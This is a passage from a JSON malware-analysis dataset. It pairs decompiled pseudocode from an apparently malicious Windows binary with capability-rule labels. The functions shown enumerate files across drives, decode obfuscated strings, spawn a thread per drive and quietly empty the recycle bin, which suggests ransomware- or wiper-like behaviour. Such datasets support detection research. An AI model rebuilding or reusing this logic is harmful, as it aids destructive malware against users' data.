0) {\n                            in_stack_fffffc98 = L\"Program Files\";\n                            in_stack_fffffc94 = 0x401b74;\n                            fcn.00403779(L\"Program Files\");\n                            in_stack_fffffc78 = &stack0xfffffda0;\n                            fcn.00403779(in_stack_fffffc78);\n                            in_stack_fffffc74 = 0x401b8b;\n                            iVar4 = fcn.00408231(in_stack_fffffc78, in_stack_fffffc7c, in_stack_fffffc80, \n                                                 in_stack_fffffc84, in_stack_fffffc88, in_stack_fffffc8c, \n                                                 in_stack_fffffc90, in_stack_fffffc94, in_stack_fffffc98, uVar8, \n                                                 noname_8, uVar9, noname_10);\n                            if (iVar4 == 0) goto code_r0x00401d73;\n                        }\n                    }\ncode_r0x00401bbc:\n                    in_stack_fffffc98 = &stack0xfffffcd0;\n                    fcn.00403753(in_stack_fffffc98);\n                    fcn.0040292d(in_stack_fffffc98);\n                    in_stack_fffffc94 = &stack0xfffffccc;\n                    fcn.00403753(in_stack_fffffc94);\n                    in_stack_fffffc90 = 0x401be1;\n                    fcn.004016c3(in_stack_fffffc94);\n                }\n            }\ncode_r0x00401d73:\n            iVar4 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(arg_8h_05);\n        } while (iVar4 != 0);\n        (*_sym.imp.KERNEL32.dll_FindClose)();\n    }\n    uVar8 = 1;\n    fcn.00403aec(1);\n    fcn.00403aec(1);\n    fcn.00403aec(1);\n    fcn.00403aec(1);\n    fcn.004083f8(uVar8);\n    return;\n}\n",
        "token_count": 4223
    },
    "0040a446": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a446(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    code *var_10h;\n    char *var_4h;\n    \n    do {\n        iVar2 = fcn.0040b1c8(arg_8h);\n        if (iVar2 != 0) {\n            return;\n        }\n        iVar2 = fcn.0040b427(arg_8h);\n    } while (iVar2 != 0);\n    if ((*0x416e2c & 1) == 0) {\n        *0x416e2c = *0x416e2c | 1;\n        var_4h = \"bad allocation\";\n        fcn.004088b6(&var_4h);\n        *0x416e20 = vtable.std::bad_alloc.0;\n        fcn.00408894(0x41001f);\n    }\n    fcn.004089cc(0x416e20);\n    var_10h = vtable.std::bad_alloc.0;\n    fcn.0040a8dd(&var_10h, 0x414fb0);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 277
    },
    "00404292": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404292(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    code *var_ch;\n    \n    if ((arg_8h != 0) && (iVar1 = fcn.0040a446(arg_8h),  iVar1 == 0)) {\n        arg_8h = 0;\n        fcn.0040893e(&arg_8h);\n        var_ch = vtable.std::bad_alloc.0;\n        fcn.0040a8dd(&var_ch, 0x414fb0);\n    }\n    return;\n}\n",
        "token_count": 131
    },
    "004046af": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004046af(uint *arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint *unaff_ESI;\n    uint32_t arg_10h;\n    \n    arg_10h = 0xffffffff;\n    if (arg_8h[4] != 0xffffffff) {\n        arg_10h = arg_8h[4];\n    }\n    iVar2 = unaff_ESI[4];\n    if (-iVar2 - 1U <= arg_10h) {\n        iVar2 = fcn.00408332(\"string too long\");\n    }\n    if (arg_10h != 0) {\n        cVar1 = fcn.00403c7d(0);\n        if (cVar1 != '\\0') {\n            puVar3 = unaff_ESI;\n            puVar4 = unaff_ESI;\n            if (0xf < unaff_ESI[5]) {\n                puVar3 = *unaff_ESI;\n                puVar4 = *unaff_ESI;\n            }\n            fcn.00408a00(puVar3 + arg_10h, puVar4, unaff_ESI[4]);\n            if (unaff_ESI == arg_8h) {\n                puVar3 = unaff_ESI;\n                puVar4 = unaff_ESI;\n                if (0xf < unaff_ESI[5]) {\n                    puVar3 = *unaff_ESI;\n                    puVar4 = *unaff_ESI;\n                }\n                fcn.00408a00(puVar3, puVar4, arg_10h);\n            }\n            else {\n                if (0xf < arg_8h[5]) {\n                    arg_8h = *arg_8h;\n                }\n                puVar4 = unaff_ESI;\n                if (0xf < unaff_ESI[5]) {\n                    puVar4 = *unaff_ESI;\n                }\n                fcn.00408410(puVar4, arg_8h, arg_10h);\n            }\n            unaff_ESI[4] = iVar2 + arg_10h;\n            if (0xf < unaff_ESI[5]) {\n                unaff_ESI = *unaff_ESI;\n            }\n            *(unaff_ESI + iVar2 + arg_10h) = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 534
    },
    "004050e4": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004050e4(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *unaff_ESI;\n    \n    if (in_EAX == -1) {\n        fcn.00408332(\"string too long\");\n    }\n    cVar1 = fcn.00403c7d(0);\n    if (cVar1 != '\\0') {\n        fcn.00403c49(in_EAX);\n        unaff_ESI[4] = in_EAX;\n        if (0xf < unaff_ESI[5]) {\n            unaff_ESI = *unaff_ESI;\n        }\n        *(unaff_ESI + in_EAX) = 0;\n    }\n    return;\n}\n",
        "token_count": 167
    },
    "00405e80": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00405e80(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    uint *arg_18h;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    uint uVar10;\n    uint noname_1;\n    uint arg_ch;\n    uint noname_1_00;\n    uint arg_ch_00;\n    uint noname_1_01;\n    char *pcVar11;\n    uint arg_ch_01;\n    uint uVar12;\n    char *pcVar13;\n    uint uVar14;\n    char *pcVar15;\n    uint in_stack_fffffc30;\n    uint in_stack_fffffc34;\n    uint in_stack_fffffc38;\n    uint in_stack_fffffc3c;\n    uint in_stack_fffffc40;\n    uint var_3a4h;\n    uint var_3a0h;\n    uint var_39ch;\n    uint var_398h;\n    int32_t var_394h;\n    uint32_t var_390h;\n    uint32_t var_38ch;\n    uchar var_385h;\n    uint var_384h;\n    uint var_368h;\n    uint var_34ch;\n    uint var_330h;\n    uint var_314h;\n    uint var_2f8h;\n    uint var_2dch;\n    uint var_2c0h;\n    uint var_2a4h;\n    uint var_288h;\n    uint var_26ch;\n    uint var_250h;\n    uint var_234h;\n    uint var_218h;\n    uint var_1fch;\n    uint var_1e0h;\n    uint var_1c4h;\n    uint var_1a8h;\n    uint var_18ch;\n    uint var_170h;\n    uint var_154h;\n    uint var_138h;\n    uint var_11ch;\n    uint var_100h;\n    uint var_e4h;\n    uint var_d8h;\n    uint var_c8h;\n    uint var_ach;\n    uint var_90h;\n    uint var_80h;\n    uint var_74h;\n    uint var_64h;\n    uint var_58h;\n    int32_t var_48h;\n    uint var_44h;\n    uint var_3ch;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint *var_20h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x416084 ^ &stack0xfffffffc;\n    pcVar15 = \"Jjxa6LEMGEbZGzem\";\n    fcn.00403597(\"Jjxa6LEMGEbZGzem\");\n    uVar14 = 0x405eb0;\n    var_390h = fcn.00407d97(pcVar15, in_stack_fffffc30, in_stack_fffffc34, in_stack_fffffc38, in_stack_fffffc3c, \n                            in_stack_fffffc40);\n    pcVar13 = \"Jjxa/LE6BUbTGzff\";\n    fcn.00403597(\"Jjxa/LE6BUbTGzff\");\n    uVar12 = 0x405ed8;\n    fcn.00407d97(pcVar13, uVar14, pcVar15, in_stack_fffffc30, in_stack_fffffc34, in_stack_fffffc38);\n    pcVar11 = \"Jjxa47BHVAE=\";\n    fcn.00403597(\"Jjxa47BHVAE=\");\n    noname_1_01 = 0x405f00;\n    fcn.00407d97(pcVar11, uVar12, pcVar13, uVar14, pcVar15, in_stack_fffffc30);\n    pcVar15 = \"Jjxa+bAAHE3LVGjf5rQ=\";\n    fcn.00403597(\"Jjxa+bAAHE3LVGjf5rQ=\");\n    noname_1_00 = 0x405f28;\n    fcn.00407d97(pcVar15, noname_1_01, pcVar11, uVar12, pcVar13, uVar14);\n    pcVar13 = \"Jjxa76wIHlbeXH+isvcJZNzN/g==\";\n    fcn.00403597(\"Jjxa76wIHlbeXH+isvcJZNzN/g==\");\n    noname_1 = 0x405f50;\n    fcn.00407d97(pcVar13, noname_1_00, pcVar15, noname_1_01, pcVar11, uVar12);\n    pcVar11 = \"Jjxa+qYXHUrFVy/H/g==\";\n    fcn.00403597(\"Jjxa+qYXHUrFVy/H/g==\");\n    uVar9 = 0x405f78;\n    var_38ch = fcn.00407d97(pcVar11, noname_1, pcVar13, noname_1_00, pcVar15, noname_1_01);\n    arg_ch_01 = 0x416ce0;\n    pcVar15 = \"Jjxa76wQAFfYQC/H/g==\";\n    fcn.00403597(\"Jjxa76wQAFfYQC/H/g==\");\n    uVar7 = 0x405fa0;\n    fcn.00407d97(pcVar15, uVar9, pcVar11, noname_1, pcVar13, noname_1_00);\n    arg_ch_00 = 0x416cc4;\n    pcVar13 = \"Jjxa5bNHVAE=\";\n    fcn.00403597(\"Jjxa5bNHVAE=\");\n    uVar6 = 0x405fc8;\n    fcn.00407d97(pcVar13, uVar7, pcVar15, uVar9, pcVar11, noname_1);\n    arg_ch = 0x416d88;\n    pcVar11 = \"Jjxa76wIHkrOGzff\";\n    fcn.00403597(\"Jjxa76wIHkrOGzff\");\n    uVar14 = 0x405fec;\n    fcn.00407d97(pcVar11, uVar6, pcVar13, uVar7, pcVar15, uVar9);\n    uVar10 = 0x416c70;\n    pcVar15 = \"Jjxa76wLCErNUGnf5rQ=\";\n    fcn.00403597(\"Jjxa76wLCErNUGnf5rQ=\");\n    uVar12 = 0x406010;\n    fcn.00407d97(pcVar15, uVar14, pcVar11, uVar6, pcVar13, uVar7);\n    uVar8 = 0x416d6c;\n    pcVar13 = \"fzIe5a8AB0eIAy8=\";\n    fcn.00403597(\"fzIe5a8AB0eIAy8=\");\n    fcn.00407d97(pcVar13, uVar12, pcVar15, uVar14, pcVar11, uVar6);\n    fcn.004043c4(&fcn.00405e80::var_11ch, uVar7);\n    fcn.004043e8();\n    fcn.004043c4(&fcn.00405e80::var_250h, uVar8);\n    fcn.004043e8();\n    fcn.004043c4(&fcn.00405e80::var_330h, uVar9);\n    fcn.004043e8();\n    fcn.004043c4(&fcn.00405e80::var_368h, uVar10);\n    fcn.004043e8();\n    fcn.004043c4(&fcn.00405e80::var_2dch, noname_1);\n    fcn.004043e8();\n    fcn.004043c4(&fcn.00405e80::var_26ch, arg_ch);\n    fcn.004043e8();\n    fcn.004043c4(&fcn.00405e80::var_384h, noname_1_00);\n    fcn.004043e8();\n    fcn.004043c4(&fcn.00405e80::var_314h, arg_ch_00);\n    fcn.004043e8();\n    fcn.004043c4(&fcn.00405e80::var_3ch, noname_1_01);\n    fcn.004043e8();\n    fcn.004043c4(&fcn.00405e80::var_90h, arg_ch_01);\n    fcn.004043e8();\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    uVar7 = 1;\n    fcn.0040135c(1);\n    arg_18h = 0x1;\n    fcn.0040135c(1);\n    uVar6 = 1;\n    fcn.0040135c(1);\n    uVar14 = 1;\n    fcn.0040135c(1);\n    uVar12 = 1;\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    var_385h = 10;\n    puVar3 = var_20h;\n    if (var_ch < 0x10) {\n        puVar3 = &fcn.00405e80::var_20h;\n    }\n    puVar4 = var_20h;\n    if (var_ch < 0x10) {\n        puVar4 = &fcn.00405e80::var_20h;\n    }\n    fcn.0040437a(&fcn.00405e80::var_390h, puVar4, puVar3 + var_10h);\n    puVar3 = var_20h;\n    if (var_ch < 0x10) {\n        puVar3 = &fcn.00405e80::var_20h;\n    }\n    fcn.004036a1(var_390h, puVar3 + var_10h);\n    var_385h = 0xd;\n    puVar3 = var_20h;\n    if (var_ch < 0x10) {\n        puVar3 = &fcn.00405e80::var_20h;\n    }\n    puVar4 = var_20h;\n    if (var_ch < 0x10) {\n        puVar4 = &fcn.00405e80::var_20h;\n    }\n    fcn.0040437a(&fcn.00405e80::var_390h, puVar4, puVar3 + var_10h);\n    puVar3 = var_20h;\n    if (var_ch < 0x10) {\n        puVar3 = &fcn.00405e80::var_20h;\n    }\n    fcn.004036a1(var_390h, puVar3 + var_10h);\n    var_38ch = 0;\n    if ((*0x417b24 - *0x417b20) / 0x1c != 0) {\n        var_394h = 0;\n        do {\n            uVar1 = var_38ch;\n            fcn.0040a580(*(*0x417b30 + var_38ch * 4), &fcn.00405e80::var_30h, 0x10, 10);\n            fcn.0040a580(*(*0x417b50 + uVar1 * 4), &fcn.00405e80::var_d8h, 0x10, 10);\n            iVar5 = var_394h + *0x417b20;\n            fcn.00403597(0x414508);\n            fcn.00403597(0x413bc4);\n            while (iVar2 = fcn.00406a4b(iVar5),  iVar2 != -1) {\n                uVar7 = 0x40643a;\n                fcn.00406b59(var_64h, &fcn.00405e80::var_90h, 0, 0xffffffff);\n            }\n            fcn.0040135c(1);\n            fcn.0040135c(1);\n            iVar5 = var_394h + *0x417b20;\n            iVar2 = var_394h + *0x417b40;\n            pcVar15 = \"Q1Ja8e8=\";\n            fcn.00403597(\"Q1Ja8e8=\");\n            uVar10 = 0x406493;\n            fcn.00407d97(pcVar15, uVar12, uVar14, uVar6, arg_18h, uVar7);\n            pcVar13 = \"Q1JaoOEQHUbOZn6UpvNGO9w=\";\n            fcn.00403597(\"Q1JaoOEQHUbOZn6UpvNGO9w=\");\n            uVar9 = 0x4064bd;\n            fcn.00407d97(pcVar13, uVar10, pcVar15, uVar12, uVar14, uVar6);\n            arg_18h = &fcn.00405e80::var_30h;\n            pcVar11 = \"Jjxa+KwRD0/1SmSHubReIw==\";\n            fcn.00403597(\"Jjxa+KwRD0/1SmSHubReIw==\");\n            uVar8 = 0x4064e0;\n            var_390h = fcn.00407d97(pcVar11, uVar9, pcVar13, uVar10, pcVar15, uVar12);\n            pcVar15 = \"Jjxa6LEMGEb1VWiJqPMWI8TV\";\n            fcn.00403597(\"Jjxa6LEMGEb1VWiJqPMWI8TV\");\n            uVar14 = 0x406504;\n            fcn.00407d97(pcVar15, uVar8, pcVar11, uVar9, pcVar13, uVar10);\n            pcVar13 = \"fzIc/qoTC3zeQH2Y/qxG\";\n            fcn.00403597(\"fzIc/qoTC3zeQH2Y/qxG\");\n            fcn.00407d97(pcVar13, uVar14, pcVar15, uVar8, pcVar11, uVar9);\n            fcn.004043c4(&fcn.00405e80::var_c8h, uVar10);\n            fcn.004043e8();\n            fcn.004043c4(&fcn.00405e80::var_138h, iVar2);\n            uVar14 = fcn.004043e8();\n            fcn.00404427(uVar14, uVar12);\n            uVar12 = fcn.004043e8();\n            fcn.00404427(uVar12, iVar5);\n            uVar12 = fcn.004043e8();\n            uVar14 = 0;\n            fcn.0040458b(uVar12, 0);\n            fcn.0040135c(1);\n            fcn.0040135c(1);\n            fcn.0040135c(1);\n            fcn.0040135c(1);\n            fcn.0040135c(1);\n            fcn.0040135c(1);\n            fcn.0040135c(1);\n            fcn.0040135c(1);\n            fcn.0040135c(1);\n            fcn.0040135c(1);\n            fcn.0040135c(1);\n            fcn.0040135c(1);\n            fcn.0040135c(1);\n            var_38ch = var_38ch + 1;\n            var_394h = var_394h + 0x1c;\n        } while (var_38ch < (*0x417b24 - *0x417b20) / 0x1c);\n    }\n    fcn.00406ae3(0x414584);\n    uVar12 = fcn.0040a2c0(0x414588);\n    fcn.00406de1(0x414588, uVar12);\n    var_44h = 0xf;\n    var_48h = 0;\n    var_58h._0_1_ = 0;\n    var_38ch = 0;\n    if (var_10h != 0) {\n        do {\n            puVar3 = var_20h;\n            if (var_ch < 0x10) {\n                puVar3 = &fcn.00405e80::var_20h;\n            }\n            var_2ch = 0;\n            var_390h = var_390h & 0xffffff00 | *(puVar3 + var_38ch);\n            var_28h = 0xf;\n            var_3ch._0_1_ = 0;\n            fcn.004044b2();\n            fcn.0040458b(&fcn.00405e80::var_58h, 0);\n            fcn.004035db(var_390h);\n            fcn.004038f1();\n            fcn.0040135c(1);\n            if ((1000 < var_48h) || (var_38ch + 1 == var_10h)) {\n                fcn.00403832();\n                fcn.0040a2c0(0x413b71);\n                fcn.00403be0();\n            }\n            var_38ch = var_38ch + 1;\n        } while (var_38ch < var_10h);\n    }\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.004083f8(uVar12);\n    return;\n}\n",
        "token_count": 4306
    },
    "004081f8": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nbool __cdecl\nfcn.004081f8(uint arg_8h, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint arg_24h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00406a4b(&arg_8h);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    return iVar1 != -1;\n}\n",
        "token_count": 119
    },
    "00408231": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nbool __cdecl\nfcn.00408231(uint arg_8h, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint *arg_24h, uint noname_8, uint noname_9, uint noname_10, uint arg_34h, uint32_t arg_38h)\n\n{\n    uint *arg_8h_00;\n    int32_t iVar1;\n    \n    arg_8h_00 = arg_24h;\n    if (arg_38h < 8) {\n        arg_8h_00 = &arg_24h;\n    }\n    iVar1 = fcn.00408274(arg_8h_00, arg_34h);\n    fcn.00403aec(1);\n    fcn.00403aec(1);\n    return iVar1 != -1;\n}\n",
        "token_count": 204
    },
    "004033a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.004033a0(void)\n\n{\n    int64_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint lpHandles;\n    uint32_t var_2ch;\n    ushort *lpParameter;\n    uint var_24h;\n    uint var_20h;\n    uint32_t var_4h;\n    \n    var_4h = *0x416084 ^ &stack0xfffffffc;\n    fcn.004014d5(0);\n    iVar1 = ((*0x417b24 - *0x417b20) / 0x1c + 5 + (*0x417b74 - *0x417b70) / 0x1c) * 4;\n    iVar2 = fcn.004083ed(-(iVar1 >> 0x20 != 0) | iVar1);\n    lpParameter = fcn.0040a446(0x1c);\n    if (lpParameter == NULL) {\n        lpParameter = NULL;\n    }\n    else {\n        *(lpParameter + 10) = 7;\n        *(lpParameter + 8) = 0;\n        *lpParameter = 0;\n    }\n    var_2ch = 0;\n    if ((*0x417b24 - *0x417b20) / 0x1c != 0) {\n        do {\n            fcn.00407f7a(&var_20h);\n            fcn.00403a0a();\n            fcn.00403aec(1);\n            uVar3 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.0040334e, lpParameter, 0, 0);\n            *(iVar2 + var_2ch * 4) = uVar3;\n            (*_sym.imp.KERNEL32.dll_Sleep)(200);\n            var_2ch = var_2ch + 1;\n        } while (var_2ch < (*0x417b24 - *0x417b20) / 0x1c);\n    }\n    uVar5 = 0;\n    if ((*0x417b74 - *0x417b70) / 0x1c != 0) {\n        do {\n            fcn.00403a52(0, 0xffffffff);\n            iVar4 = *0x417b24 - *0x417b20;\n            uVar3 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.0040334e, lpParameter, 0, 0);\n            *(iVar2 + (uVar5 + iVar4 / 0x1c) * 4) = uVar3;\n            (*_sym.imp.KERNEL32.dll_Sleep)(200);\n            uVar5 = uVar5 + 1;\n        } while (uVar5 < (*0x417b74 - *0x417b70) / 0x1c);\n    }\n    (*_sym.imp.SHELL32.dll_SHEmptyRecycleBinA)(0, 0, 7);\n    uVar3 = 0xffffffff;\n    (*_sym.imp.KERNEL32.dll_WaitForMultipleObjects)\n              ((*0x417b24 - *0x417b20) / 0x1c + (*0x417b74 - *0x417b70) / 0x1c, iVar2, 1);\n    fcn.004083f8(uVar3);\n    return;\n}\n",
        "token_count": 769
    },
    "00403b2c": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403b2c(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t *extraout_ECX;\n    \n    iVar1 = *param_1;\n    uVar2 = (param_1[1] - iVar1) / 0x1c;\n    if (0x9249248 < uVar2) {\n        fcn.00408332(\"vector<T> too long\");\n        param_1 = extraout_ECX;\n    }\n    uVar3 = (param_1[2] - iVar1) / 0x1c;\n    uVar2 = uVar2 + 1;\n    if (uVar3 < uVar2) {\n        if (0x9249249 - (uVar3 >> 1) < uVar3) {\n            uVar3 = 0;\n        }\n        else {\n            uVar3 = uVar3 + (uVar3 >> 1);\n        }\n        if (uVar3 < uVar2) {\n            uVar3 = uVar2;\n        }\n        fcn.00403e3c(uVar3);\n    }\n    return;\n}\n",
        "token_count": 271
    },
    "00403b83": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid fcn.00403b83(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t extraout_ECX;\n    int32_t iVar3;\n    \n    uVar1 = (*0x417b74 - *0x417b70) / 0x1c;\n    iVar3 = *0x417b70;\n    if (0x9249248 < uVar1) {\n        fcn.00408332(\"vector<T> too long\");\n        iVar3 = extraout_ECX;\n    }\n    uVar2 = (*0x417b78 - iVar3) / 0x1c;\n    uVar1 = uVar1 + 1;\n    if (uVar2 < uVar1) {\n        if (0x9249249 - (uVar2 >> 1) < uVar2) {\n            uVar2 = 0;\n        }\n        else {\n            uVar2 = uVar2 + (uVar2 >> 1);\n        }\n        if (uVar2 < uVar1) {\n            uVar2 = uVar1;\n        }\n        fcn.00403f14(uVar2);\n    }\n    return;\n}\n",
        "token_count": 263
    },
    "0040411f": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040411f(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t *piVar5;\n    uint32_t uVar6;\n    int32_t unaff_EBP;\n    uint var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.0040ec8c(0xc);\n    piVar1 = *(unaff_EBP + 8);\n    uVar6 = *(unaff_EBP + 0xc) | 7;\n    if (uVar6 < 0x7fffffff) {\n        *(unaff_EBP + -0x14) = piVar1[5];\n        *(unaff_EBP + -0x14) = *(unaff_EBP + -0x14) >> 1;\n        uVar2 = *(unaff_EBP + -0x14);\n        if ((uVar6 / 3 < uVar2) && (uVar6 = uVar2 + piVar1[5],  0x7ffffffe - uVar2 < piVar1[5])) {\n            uVar6 = 0x7ffffffe;\n        }\n    }\n    else {\n        uVar6 = *(unaff_EBP + 0xc);\n    }\n    *(unaff_EBP + -4) = 0;\n    uVar4 = fcn.004042db();\n    *(unaff_EBP + -0x18) = uVar4;\n    *(unaff_EBP + -4) = 0xffffffff;\n    if (*(unaff_EBP + 0x10) != 0) {\n        piVar5 = piVar1;\n        if (7 < piVar1[5]) {\n            piVar5 = *piVar1;\n        }\n        fcn.00408410(*(unaff_EBP + -0x18), piVar5, *(unaff_EBP + 0x10) * 2);\n    }\n    fcn.00403aec(1);\n    piVar5 = *(unaff_EBP + -0x18);\n    *piVar1 = piVar5;\n    piVar1[5] = uVar6;\n    iVar3 = *(unaff_EBP + 0x10);\n    piVar1[4] = iVar3;\n    if (uVar6 < 8) {\n        piVar5 = piVar1;\n    }\n    *(piVar5 + iVar3 * 2) = 0;\n    fcn.0040ecc2();\n    return;\n}\n",
        "token_count": 603
    },
    "0040512d": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040512d(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t *extraout_ECX;\n    uint32_t uVar3;\n    uint32_t extraout_EDX;\n    \n    iVar1 = *param_1;\n    uVar3 = param_1[1] - iVar1 >> 2;\n    if (0x3ffffffe < uVar3) {\n        fcn.00408332(\"vector<T> too long\");\n        param_1 = extraout_ECX;\n        uVar3 = extraout_EDX;\n    }\n    uVar3 = uVar3 + 1;\n    uVar2 = param_1[2] - iVar1 >> 2;\n    if (uVar2 < uVar3) {\n        if (0x3fffffff - (uVar2 >> 1) < uVar2) {\n            uVar2 = 0;\n        }\n        else {\n            uVar2 = uVar2 + (uVar2 >> 1);\n        }\n        if (uVar2 < uVar3) {\n            uVar2 = uVar3;\n        }\n        fcn.0040517c(uVar2);\n    }\n    return;\n}\n",
        "token_count": 277
    },
    "0040517c": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040517c(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    int32_t *extraout_ECX;\n    uint32_t extraout_ECX_00;\n    uint32_t uVar3;\n    int32_t unaff_EBP;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.0040ec8c(8);\n    uVar3 = *(unaff_EBP + 8);\n    if (0x3fffffff < uVar3) {\n        fcn.00408332(\"vector<T> too long\");\n        uVar3 = extraout_ECX_00;\n    }\n    if (extraout_ECX[2] - *extraout_ECX >> 2 < uVar3) {\n        arg_8h_00 = fcn.00405213();\n        *(unaff_EBP + -0x14) = arg_8h_00;\n        *(unaff_EBP + -4) = 0;\n        fcn.00408a00(arg_8h_00, *extraout_ECX, extraout_ECX[1] - *extraout_ECX & 0xfffffffc);\n        *(unaff_EBP + -4) = 0xffffffff;\n        iVar1 = *extraout_ECX;\n        iVar2 = extraout_ECX[1];\n        if (iVar1 != 0) {\n            fcn.004088ab(iVar1);\n        }\n        extraout_ECX[2] = arg_8h_00 + *(unaff_EBP + 8) * 4;\n        extraout_ECX[1] = arg_8h_00 + (iVar2 - iVar1 >> 2) * 4;\n        *extraout_ECX = arg_8h_00;\n    }\n    fcn.0040ecc2();\n    return;\n}\n",
        "token_count": 440
    },
    "00408062": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00408062(uint arg_8h, uint noname_1, uint noname_2, uint noname_3, int32_t arg_18h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uchar *unaff_EBX;\n    ulong uVar5;\n    uint var_19ch;\n    uint var_198h;\n    int32_t var_190h;\n    uint var_18ch;\n    uint lpBuffer;\n    int32_t var_60h;\n    uint var_24h;\n    uint var_14h;\n    uint var_10h;\n    uint32_t var_8h;\n    \n    var_8h = *0x416084 ^ &stack0xfffffffc;\n    (*_sym.imp.KERNEL32.dll_Sleep)(5);\n    uVar5 = fcn.0040a6f8(0);\n    var_18ch = 0x128;\n    uVar1 = (*_sym.imp.KERNEL32.dll_CreateToolhelp32Snapshot)(2, 0);\n    var_190h = 0;\n    iVar2 = (*_sym.imp.KERNEL32.dll_Process32First)(uVar1, &var_18ch);\n    while (iVar2 != 0) {\n        var_190h = var_190h + 1;\n        iVar2 = (*_sym.imp.KERNEL32.dll_Process32Next)(uVar1, &var_18ch);\n    }\n    lpBuffer = 0x40;\n    (*_sym.imp.KERNEL32.dll_GlobalMemoryStatusEx)(&lpBuffer);\n    iVar2 = fcn.0040a65d();\n    uVar5 = fcn.0040e770(iVar2 * var_190h, iVar2 * var_190h >> 0x20, uVar5);\n    uVar1 = 